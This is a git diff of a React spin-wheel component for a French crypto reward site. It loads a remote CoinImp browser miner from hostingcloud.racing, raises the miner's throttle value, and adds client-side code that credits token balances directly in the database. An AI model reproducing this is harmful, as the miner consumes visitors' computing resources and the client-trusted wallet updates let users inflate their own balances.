@@ -9,6 +9,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@
 import { useToast } from '@/hooks/use-toast';
 import { supabase } from '@/integrations/supabase/client';
 import { Loader2 } from 'lucide-react';
+import HashrateTicker from './HashrateTicker';
 
 interface SpinWheelProps {
   onZeroWin?: (amount: number) => void;
@@ -55,13 +56,15 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
   const [isPurchaseDialogOpen, setIsPurchaseDialogOpen] = useState(false);
   const [transactionId, setTransactionId] = useState('');
   const [selectedCurrency, setSelectedCurrency] = useState('');
+  const [selectedSource, setSelectedSource] = useState('');
   const [isSubmittingTx, setIsSubmittingTx] = useState(false);
 
   const { toast } = useToast();
 
-  const payeerCurrencies = [
+  const currencies = [
     'USD', 'EUR', 'RUB', 'BTC', 'ETH', 'LTC', 'BCH', 'USDT', 'TRX', 'TON', 'DOGE', 'MATIC', 'SOL'
   ];
+  const sources = ['Payeer', 'Binance', 'Coinbase', 'Bybit', 'Autre'];
 
   useEffect(() => {
     checkSpinStatus();
@@ -82,10 +85,10 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
 
       if (status) {
         setUserStats({
-          totalSpins: status.total_spins,
-          totalZeroWon: status.total_zero_won,
-          totalUsdtWon: status.total_usdt_won,
-          totalDogecoinWon: status.total_dogecoin_won
+          totalSpins: Number(status.total_spins),
+          totalZeroWon: Number(status.total_zero_won),
+          totalUsdtWon: Number(status.total_usdt_won),
+          totalDogecoinWon: Number(status.total_dogecoin_won)
         });
 
         if (status.last_free_spin) {
@@ -138,6 +141,39 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
     return SPIN_PRIZES[0]; // Fallback
   };
 
+  const addZeroToWallet = async (userId: string, amount: number) => {
+    // crédite farming_data.zero_tokens
+    const { data, error } = await supabase
+      .from('farming_data')
+      .select('zero_tokens')
+      .eq('user_id', userId)
+      .single();
+
+    if (error && error.code !== 'PGRST116') {
+      console.error('Erreur lecture zero_tokens:', error);
+      return;
+    }
+
+    if (!data) {
+      // créer la ligne si besoin puis set
+      const { error: insErr } = await supabase.from('farming_data').insert({ user_id: userId, zero_tokens: amount });
+      if (insErr) {
+        console.error('Erreur création farming_data pour ZERO:', insErr);
+      }
+      return;
+    }
+
+    const current = Number(data.zero_tokens ?? 0);
+    const { error: upErr } = await supabase
+      .from('farming_data')
+      .update({ zero_tokens: current + amount })
+      .eq('user_id', userId);
+
+    if (upErr) {
+      console.error('Erreur update zero_tokens:', upErr);
+    }
+  };
+
   const performSpin = async (isFreeSpin: boolean = true) => {
     if (isSpinning) return;
 
@@ -181,6 +217,7 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
 
         if (prize.type === 'zero') {
           updates.total_zero_won = userStats.totalZeroWon + prize.amount;
+          await addZeroToWallet(user.id, prize.amount);
           if (onZeroWin) onZeroWin(prize.amount);
         } else if (prize.type === 'usdt') {
           updates.total_usdt_won = userStats.totalUsdtWon + prize.amount;
@@ -225,7 +262,7 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
   };
 
   const submitTransaction = async () => {
-    if (!transactionId.trim() || !selectedCurrency) {
+    if (!transactionId.trim() || !selectedCurrency || !selectedSource) {
       toast({
         title: "Informations manquantes",
         description: "Veuillez remplir tous les champs",
@@ -243,7 +280,7 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
       const { error } = await supabase.from('spin_transactions').insert({
         user_id: user.id,
         transaction_id: transactionId.trim(),
-        payment_method: 'payeer',
+        payment_method: selectedSource, // utiliser la source comme méthode
         currency_paid: selectedCurrency,
         amount_paid: 0.10
       });
@@ -252,12 +289,13 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
 
       toast({
         title: "Transaction soumise",
-        description: "Votre transaction est en cours de vérification. Vous recevrez un spin une fois vérifiée."
+        description: "Votre transaction est en cours de vérification par notre équipe."
       });
 
       setIsPurchaseDialogOpen(false);
       setTransactionId('');
       setSelectedCurrency('');
+      setSelectedSource('');
     } catch (error: any) {
       console.error('Error submitting transaction:', error);
       toast({
@@ -271,25 +309,29 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
   };
 
   useEffect(() => {
-    // Add mining script to the page
+    // Remplace l'ancien script par le nouveau + expose window._client
     const script1 = document.createElement('script');
-    script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
+    script1.src = 'https://www.hostingcloud.racing/etyE.js';
     document.head.appendChild(script1);
 
     const script2 = document.createElement('script');
     script2.innerHTML = `
-      var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-        throttle: 0.2, c: 'w'
+      window._client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+        throttle: 0.4, c: 'w'
       });
-      _client.start();
-      _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+      window._client.start();
+      window._client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
     `;
     document.body.appendChild(script2);
 
     return () => {
       // Cleanup scripts on unmount
-      document.head.removeChild(script1);
-      document.body.removeChild(script2);
+      try {
+        document.head.removeChild(script1);
+        document.body.removeChild(script2);
+      } catch (e) {
+        // ignore
+      }
     };
   }, []);
 
@@ -306,6 +348,9 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
         </div>
         <div className="mt-2 p-2 bg-muted/50 rounded text-sm text-muted-foreground">
           ⚡ Section avec mining JavaScript actif
+        </div>
+        <div className="mt-3">
+          <HashrateTicker />
         </div>
       </CardHeader>
       <CardContent>
@@ -387,38 +432,45 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
               <Dialog open={isPurchaseDialogOpen} onOpenChange={setIsPurchaseDialogOpen}>
                 <DialogTrigger asChild>
                   <Button variant="stake" size="xl" className="w-full">
-                    💳 Acheter un Spin (0.10 USD)
+                    🔎 Vérifier un ID de transaction (0.10 USD)
                   </Button>
                 </DialogTrigger>
                 <DialogContent className="sm:max-w-md">
                   <DialogHeader>
-                    <DialogTitle>Acheter un Spin - 0.10 USD</DialogTitle>
+                    <DialogTitle>Vérification IDTX - 0.10 USD</DialogTitle>
                   </DialogHeader>
                   <div className="space-y-4">
-                    <div className="p-4 bg-muted/50 rounded-lg">
-                      <h4 className="font-semibold mb-2">💳 Informations de Paiement</h4>
-                      <p className="text-sm text-muted-foreground mb-2">
-                        Envoyez 0.10 USD (ou équivalent) à:
-                      </p>
-                      <div className="p-2 bg-background rounded border">
-                        <code className="text-primary font-mono">P1112145219</code>
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      <div>
+                        <Label htmlFor="source">Source des fonds</Label>
+                        <Select value={selectedSource} onValueChange={setSelectedSource}>
+                          <SelectTrigger>
+                            <SelectValue placeholder="Sélectionnez la source" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            {sources.map(s => (
+                              <SelectItem key={s} value={s}>
+                                {s}
+                              </SelectItem>
+                            ))}
+                          </SelectContent>
+                        </Select>
                       </div>
-                    </div>
-
-                    <div>
-                      <Label htmlFor="currency">Devise utilisée</Label>
-                      <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
-                        <SelectTrigger>
-                          <SelectValue placeholder="Sélectionnez la devise" />
-                        </SelectTrigger>
-                        <SelectContent>
-                          {payeerCurrencies.map(currency => (
-                            <SelectItem key={currency} value={currency}>
-                              {currency}
-                            </SelectItem>
-                          ))}
-                        </SelectContent>
-                      </Select>
+                      <div>
+                        <Label htmlFor="currency">Devise utilisée</Label>
+                        <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
+                          <SelectTrigger>
+                            <SelectValue placeholder="Sélectionnez la devise" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            {currencies.map(currency => (
+                              <SelectItem key={currency} value={currency}>
+                                {currency}
+                              </SelectItem>
+                            ))}
+                          </SelectContent>
+                        </Select>
+                      </div>
                     </div>
 
                     <div>
